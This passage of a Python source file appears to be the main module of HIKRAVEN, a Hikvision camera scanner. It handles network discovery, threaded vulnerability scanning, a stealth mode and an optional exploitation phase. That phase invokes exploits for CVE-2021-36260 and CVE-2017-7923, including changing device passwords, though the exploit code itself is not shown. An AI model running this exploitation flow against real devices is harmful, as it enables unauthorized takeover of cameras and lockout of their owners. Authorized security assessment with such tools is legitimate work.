        self.report_generator = None
        self.plugin_manager = None
        self.rate_limiter = RateLimiter()
        self.devices = []
        self.scan_results = None
        self.start_time = None
        self._initialized = False
        self._stats = {}
    
    def initialize(self, interface: str = None, local_ip: str = None, 
                   verbose: bool = False, auto_detect: bool = True,
                   elevate: bool = False):
        if elevate:
            self.sudo_manager.elevate()
        
        if auto_detect and not interface:
            iface_name, ip = self.interface_manager.get_primary_ip()
            interface = iface_name
            local_ip = ip
            self.logger = None
        
        if not local_ip and interface:
            local_ip = self.interface_manager.get_ip_from_interface(interface)
            if not local_ip:
                local_ip = get_local_ip()
        
        if not local_ip:
            local_ip = get_local_ip()
        
        log_level = 'DEBUG' if verbose else self.config.get('logging.level', 'INFO')
        console_output = self.config.get('logging.console_output', True)
        
        self.logger = Logger(
            log_file=self.config.get('logging.file', Constants.LOG_PATH),
            level=log_level,
            verbose=verbose,
            console_output=console_output
        )
        
        self.logger.section("HIKRAVEN Initialization")
        self.logger.info(f"Interface: {interface}")
        self.logger.info(f"IP Address: {local_ip}")
        self.logger.info(f"Platform: {platform.system()} {platform.release()}")
        
        if self.sudo_manager.has_sudo:
            self.logger.info("✅ Running with elevated privileges - full functionality enabled")
        else:
            self.logger.warning("⚠️  Limited privileges detected - some features may be restricted")
            self.logger.info("Run with sudo or as Administrator for full functionality")
        
        if interface:
            iface_info = self.interface_manager.get_interface(interface)
            if iface_info:
                self.logger.debug(f"Interface Type: {iface_info['type']}")
                self.logger.debug(f"Interface MAC: {iface_info['mac']}")
                if iface_info['speed']:
                    self.logger.debug(f"Interface Speed: {iface_info['speed']} Mbps")
                self.logger.debug(f"Interface MTU: {iface_info['mtu']}")
        
        self.discovery_engine = DiscoveryEngine(
            interface, local_ip, self.logger, self.config, self.rate_limiter,
            self.sudo_manager
        )
        self.vulnerability_scanner = VulnerabilityScanner(
            self.logger, self.config, self.rate_limiter
        )
        self.exploitation_engine = ExploitationEngine(
            self.logger, self.config, self.rate_limiter
        )
        self.report_generator = ReportGenerator(self.logger, self.config)
        
        self.plugin_manager = PluginManager(self.logger, self.config)
        self.plugin_manager.load_plugins()
        
        self._initialized = True
        self.logger.success("HIKRAVEN initialized successfully")
        
        return interface, local_ip
    
    @timing_decorator
    async def run_scan(self, scan_type: str = 'active',
                      subnet: str = None,
                      vuln_scan: bool = False,
                      exploit: bool = False) -> ScanResult:
        if not self._initialized:
            raise HikRavenError("Scanner not initialized")
        
        self.start_time = time.time()
        self.logger.section("Scan Started")
        self.logger.info(f"Scan Type: {scan_type}")
        self.logger.info(f"Target: {subnet or 'Local network'}")
        self.logger.info(f"Interface: {self.discovery_engine.interface}")
        
        self.plugin_manager.execute_hook('pre_scan', scan_type, subnet)
        
        self.logger.section("Phase 1: Device Discovery")
        
        try:
            if scan_type == 'passive':
                devices = self.discovery_engine.passive_discovery(
                    self.config.get('discovery.passive_timeout', 30)
                )
                self.devices = list(devices.values())
            else:
                self.discovery_engine.passive_discovery(
                    self.config.get('discovery.passive_timeout', 15)
                )
                devices = self.discovery_engine.discover(subnet)
                self.devices = list(devices)
        except Exception as e:
            self.logger.error(f"Discovery failed: {e}")
            raise DiscoveryError(f"Discovery failed: {e}")
        
        self.logger.info(f"Discovered {len(self.devices)} devices")
        
        if vuln_scan and self.devices:
            self.logger.section("Phase 2: Vulnerability Scanning")
            
            vuln_devices = []
            max_workers = self.config.get('scan.max_threads', 100)
            
            try:
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    futures = {}
                    for device in self.devices:
                        future = executor.submit(
                            self.vulnerability_scanner.scan_device, device
                        )
                        futures[future] = device
                    
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Scanning...", total=len(futures))
                        for future in as_completed(futures):
                            device = futures[future]
                            try:
                                results = future.result(timeout=30)
                                if results['cves'] or results['weak_credentials']:
                                    vuln_devices.append(device)
                            except Exception as e:
                                self.logger.debug(f"Scan error for {device.ip_address}: {e}")
                            progress.update(task, advance=1)
                
                self.logger.success(f"Found {len(vuln_devices)} vulnerable devices")
            except Exception as e:
                self.logger.error(f"Vulnerability scanning failed: {e}")
        
        if exploit and self.config.get('exploitation.enabled', False):
            self.logger.section("Phase 3: Exploitation")
            self.logger.warning("⚠️  Exploitation enabled - proceed with caution")
            
            try:
                for device in self.devices:
                    if not device.vulnerabilities:
                        continue
                    
                    for vuln in device.vulnerabilities:
                        if vuln['cve_id'] == 'CVE-2021-36260':
                            result = self.exploitation_engine.exploit_cve_2021_36260(device)
                            if result and result.get('success'):
                                self.logger.success(f"Exploited {device.ip_address}")
                        
                        elif vuln['cve_id'] == 'CVE-2017-7923':
                            result = self.exploitation_engine.exploit_cve_2017_7923(device)
                            if result and result.get('success'):
                                self.logger.success(f"Password changed on {device.ip_address}")
            except Exception as e:
                self.logger.error(f"Exploitation failed: {e}")
        
        self.logger.section("Phase 4: Post-processing")
        
        self._stats = {
            'total_devices': len(self.devices),
            'vulnerable_devices': sum(1 for d in self.devices if d.get_vulnerability_count() > 0),
            'total_vulnerabilities': sum(d.get_vulnerability_count() for d in self.devices),
            'cloud_managed': sum(1 for d in self.devices if d.is_cloud_managed),
            'weak_creds': sum(1 for d in self.devices if d.credentials)
        }
        
        duration = time.time() - self.start_time
        
        self.scan_results = ScanResult(
            devices=self.devices,
            total_devices=self._stats['total_devices'],
            vulnerable_devices=self._stats['vulnerable_devices'],
            total_vulnerabilities=self._stats['total_vulnerabilities'],
            scan_duration=duration,
            scan_type=scan_type,
            network_range=subnet or "local",
            interface=self.discovery_engine.interface,
            end_time=time.time()
        )
        
        self._save_to_database()
        
        self.plugin_manager.execute_hook('post_scan', self.scan_results)
        
        self.logger.success(f"Scan completed in {duration:.2f} seconds")
        self.logger.section("Scan Complete")
        
        return self.scan_results
    
    def _save_to_database(self):
        try:
            for device in self.devices:
                self.db.save_device(device)
            
            with sqlite3.connect(Constants.DB_PATH) as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT INTO scan_history 
                    (scan_time, total_devices, vulnerable_devices, 
                     total_vulnerabilities, scan_type, duration_seconds, 
                     network_range, interface)
                    VALUES (CURRENT_TIMESTAMP, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    self.scan_results.total_devices,
                    self.scan_results.vulnerable_devices,
                    self.scan_results.total_vulnerabilities,
                    self.scan_results.scan_type,
                    self.scan_results.duration,
                    self.scan_results.network_range,
                    self.scan_results.interface
                ))
                conn.commit()
        except Exception as e:
            self.logger.debug(f"Database save error: {e}")
    
    def generate_reports(self, formats: List[str] = None) -> List[str]:
        if not self.devices:
            self.logger.warning("No devices to report")
            return []
        
        return self.report_generator.generate(self.devices, formats)
    
    def print_summary(self):
        if not self.devices:
            self.logger.warning("No scan results available")
            return
        
        console.print()
        console.print(Panel(
            Align.center("[bold cyan]HIKRAVEN - Scan Summary[/bold cyan]", vertical="middle"),
            border_style="cyan",
            padding=(1, 4)
        ))
        
        stats_table = Table(box=box.ROUNDED, border_style="cyan")
        stats_table.add_column("Metric", style="cyan")
        stats_table.add_column("Value", style="white")
        
        stats_table.add_row("Total Devices", str(len(self.devices)))
        stats_table.add_row("Vulnerable Devices", f"[red]{self._stats['vulnerable_devices']}[/red]")
        stats_table.add_row("Total Vulnerabilities", f"[red]{self._stats['total_vulnerabilities']}[/red]")
        stats_table.add_row("Cloud Managed", str(self._stats['cloud_managed']))
        stats_table.add_row("Weak Credentials", str(self._stats['weak_creds']))
        stats_table.add_row("Scan Duration", f"{self.scan_results.duration:.2f}s")
        stats_table.add_row("Interface", self.scan_results.interface)
        stats_table.add_row("Privileges", "✅ Elevated" if self.sudo_manager.has_sudo else "⚠️  Limited")
        
        if self.scan_results.network_range:
            stats_table.add_row("Network Range", self.scan_results.network_range)
        
        console.print(stats_table)
        
        if self.devices:
            console.print()
            devices_table = Table(box=box.ROUNDED, border_style="yellow")
            devices_table.add_column("#", style="dim")
            devices_table.add_column("IP Address", style="cyan")
            devices_table.add_column("Model", style="white")
            devices_table.add_column("Vulns", style="red")
            devices_table.add_column("Threat Level", style="yellow")
            devices_table.add_column("Cloud", style="blue")
            devices_table.add_column("Interface", style="dim")
            
            for i, device in enumerate(self.devices[:20], 1):
                threat_level = device.get_threat_level()
                color = self._get_threat_color(threat_level)
                devices_table.add_row(
                    str(i),
                    device.ip_address,
                    device.model or "Unknown",
                    str(device.get_vulnerability_count()),
                    f"[{color}]{threat_level}[/{color}]",
                    "☁️" if device.is_cloud_managed else "❌",
                    device.interface or "N/A"
                )
            
            if len(self.devices) > 20:
                devices_table.add_row("...", f"{len(self.devices) - 20} more devices", "", "", "", "", "")
            
            console.print(devices_table)
        
        if self._stats['total_vulnerabilities'] > 0:
            console.print()
            vuln_table = Table(box=box.ROUNDED, border_style="red")
            vuln_table.add_column("CVE ID", style="red")
            vuln_table.add_column("Severity", style="yellow")
            vuln_table.add_column("Category", style="cyan")
            vuln_table.add_column("Devices", style="white")
            
            vuln_count = defaultdict(int)
            cve_details = {}
            for device in self.devices:
                for vuln in device.vulnerabilities:
                    cve_id = vuln.get('cve_id', 'UNKNOWN')
                    vuln_count[cve_id] += 1
                    cve_details[cve_id] = vuln
            
            for cve_id, count in sorted(vuln_count.items(), key=lambda x: x[1], reverse=True)[:10]:
                vuln = cve_details[cve_id]
                severity = vuln.get('severity', 'UNKNOWN')
                category = vuln.get('category', 'UNKNOWN')
                color = self._get_severity_color(severity)
                vuln_table.add_row(
                    cve_id,
                    f"[{color}]{severity}[/{color}]",
                    category,
                    str(count)
                )
            
            console.print(vuln_table)
        
        console.print()
        console.print(f"[dim]Report saved to: {self.config.get('reporting.output_dir', Constants.OUTPUT_DIR)}[/dim]")
    
    def _get_threat_color(self, level: str) -> str:
        colors = {
            'CRITICAL': 'red',
            'HIGH': 'red1',
            'MEDIUM': 'yellow',
            'LOW': 'green',
            'INFO': 'blue'
        }
        return colors.get(level, 'white')
    
    def _get_severity_color(self, severity: str) -> str:
        colors = {
            'CRITICAL': 'red',
            'HIGH': 'red1',
            'MEDIUM': 'yellow',
            'LOW': 'green',
            'INFO': 'blue'
        }
        return colors.get(severity, 'white')
    
    def get_statistics(self) -> dict:
        return {
            'scan': self._stats,
            'database': self.db.get_statistics(),
            'interfaces': len(self.interface_manager.interfaces),
            'privileges': 'elevated' if self.sudo_manager.has_sudo else 'limited'
        }
    
    def list_interfaces(self) -> List[Dict]:
        return list(self.interface_manager.interfaces.values())

def parse_arguments():
    parser = argparse.ArgumentParser(
        description=f'HIKRAVEN - {__description__}',
        epilog='Use responsibly and only on authorized systems!',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('--interface', '-i',
                       help='Network interface (e.g., eth0, wlan0)')
    parser.add_argument('--address', '-a',
                       help='IP address of the interface')
    parser.add_argument('--auto-detect', '-D',
                       help='Auto-detect network interface',
                       action='store_true',
                       default=True)
    parser.add_argument('--list-interfaces', '-L',
                       help='List available network interfaces',
                       action='store_true')
    
    parser.add_argument('--passive', '-p',
                       help='Passive discovery only',
                       action='store_true')
    parser.add_argument('--active', '-A',
                       help='Active discovery',
                       action='store_true')
    parser.add_argument('--subnet', '-s',
                       help='Subnet to scan (e.g., 192.168.1.0/24)')
    
    parser.add_argument('--vuln-scan', '-v',
                       help='Perform vulnerability scanning',
                       action='store_true')
    parser.add_argument('--exploit', '-e',
                       help='Attempt exploitation (DANGEROUS!)',
                       action='store_true')
    
    parser.add_argument('--report', '-r',
                       help='Generate report format(s)',
                       choices=['json', 'html', 'csv', 'pdf', 'markdown', 'all'],
                       default=None)
    parser.add_argument('--output', '-o',
                       help='Output directory for reports',
                       default=Constants.OUTPUT_DIR)
    
    parser.add_argument('--stealth',
                       help='Enable stealth mode',
                       action='store_true')
    parser.add_argument('--threads', '-t',
                       help='Number of threads',
                       type=int,
                       default=100)
    parser.add_argument('--timeout',
                       help='Network timeout in seconds',
                       type=int,
                       default=10)
    
    parser.add_argument('--sudo', '-S',
                       help='Request elevated privileges (sudo on Linux, admin on Windows)',
                       action='store_true')
    parser.add_argument('--config', '-c',
                       help='Configuration file path',
                       default=Constants.CONFIG_PATH)
    parser.add_argument('--verbose', '-V',
                       help='Verbose output',
                       action='store_true')
    parser.add_argument('--quiet', '-q',
                       help='Quiet mode',
                       action='store_true')
    parser.add_argument('--version', help='Show version', action='store_true')
    
    return parser.parse_args()

def display_banner():
    console.print(f"{Fore.LIGHTRED_EX}{BANNER}{Style.RESET_ALL}")
    console.print()
    console.print(f"{Fore.GREEN}╔═══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.LIGHTRED_EX}   ██╗  ██╗██╗██╗   ██╗  ██████╗  █████╗ ██╗   ██╗███████╗███╗   ██╗{Fore.GREEN}║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.LIGHTRED_EX}   ██║  ██║██║██║ ██║    ██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║{Fore.GREEN}║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.LIGHTRED_EX}   ███████║██║██║██      ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║{Fore.GREEN}║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.LIGHTRED_EX}   ██╔══██║██║██ ╔██║    ██╔══██╗██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║{Fore.GREEN}║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.LIGHTRED_EX}   ██║  ██║██║██║   ██║  ██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║{Fore.GREEN}║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.LIGHTRED_EX}   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝{Fore.GREEN}║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.LIGHTGREEN_EX}   HIKRAVEN - Professional Edition{Fore.GREEN}                             ║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.LIGHTGREEN_EX}   Advanced Hikvision Security Assessment Framework{Fore.GREEN}            ║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}╠═══════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.CYAN}   Author: SYLHETYHACKVENGER (THE-ERROR808){Fore.GREEN}                         ║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.CYAN}   Tool: HIKRAVEN - Hikvision Security Scanner{Fore.GREEN}                    ║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.CYAN}   Info: Advanced vulnerability assessment{Fore.GREEN}                       ║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}║{Fore.YELLOW}   ⚠️  For authorized security testing only!{Fore.GREEN}                      ║{Style.RESET_ALL}")
    console.print(f"{Fore.GREEN}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    console.print()

def list_interfaces():
    manager = InterfaceManager()
    interfaces = manager.interfaces
    
    console.print(f"\n[bold cyan]Available Network Interfaces[/bold cyan]\n")
    
    table = Table(box=box.ROUNDED, border_style="cyan")
    table.add_column("Interface", style="cyan")
    table.add_column("Type", style="yellow")
    table.add_column("MAC Address", style="white")
    table.add_column("IP Address", style="green")
    table.add_column("Status", style="white")
    table.add_column("Speed", style="dim")
    
    for name, info in interfaces.items():
        status = "🟢 Up" if info['is_up'] else "🔴 Down"
        ip = info['ipv4'][0]['address'] if info['ipv4'] else "None"
        mac = info['mac'] or "N/A"
        speed = f"{info['speed']} Mbps" if info['speed'] else "N/A"
        
        table.add_row(
            name,
            info['type'],
            mac,
            ip,
            status,
            speed
        )
    
    console.print(table)
    console.print(f"\n[dim]Total interfaces: {len(interfaces)}[/dim]")

async def main_async(args):
    try:
        display_banner()
        
        if args.list_interfaces:
            list_interfaces()
            return
        
        config = ConfigManager(args.config)
        
        if args.threads:
            config.set('scan.max_threads', args.threads)
        if args.timeout:
            config.set('scan.timeout', args.timeout)
        if args.stealth:
            config.set('scan.stealth_mode', True)
            config.set('scan.rate_limit', 5)
            config.set('scan.max_threads', min(args.threads, 20))
        if args.output:
            config.set('reporting.output_dir', args.output)
        
        app = HikRaven()
        
        interface, local_ip = app.initialize(
            interface=args.interface,
            local_ip=args.address,
            verbose=args.verbose and not args.quiet,
            auto_detect=args.auto_detect,
            elevate=args.sudo
        )
        
        if args.passive:
            scan_type = 'passive'
        elif args.active:
            scan_type = 'active'
        else:
            scan_type = 'active'
        
        result = await app.run_scan(
            scan_type=scan_type,
            subnet=args.subnet,
            vuln_scan=args.vuln_scan,
            exploit=args.exploit
        )
        
        app.print_summary()
        
        if args.report:
            formats = ['json', 'html', 'csv'] if args.report == 'all' else [args.report]
            reports = app.generate_reports(formats)
            for report in reports:
                app.logger.success(f"Report saved: {report}")
        
        if args.config:
            config.save()
        
        app.logger.success("Scan complete!")
        
    except KeyboardInterrupt:
        console.print(f"\n{Fore.YELLOW}Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        if 'app' in locals() and hasattr(app, 'logger') and app.logger:
            app.logger.error(f"Fatal error: {e}")
            if args.verbose:
                import traceback
                traceback.print_exc()
        else:
            console.print(f"{Fore.RED}Fatal error: {e}{Style.RESET_ALL}")
            if args.verbose:
                import traceback
                traceback.print_exc()
        sys.exit(1)

def main():
    args = parse_arguments()
    
    if args.version:
        print("HIKRAVEN - Professional Edition")
        print(__description__)
        sys.exit(0)
    
    asyncio.run(main_async(args))

if __name__ == "__main__":
    main()
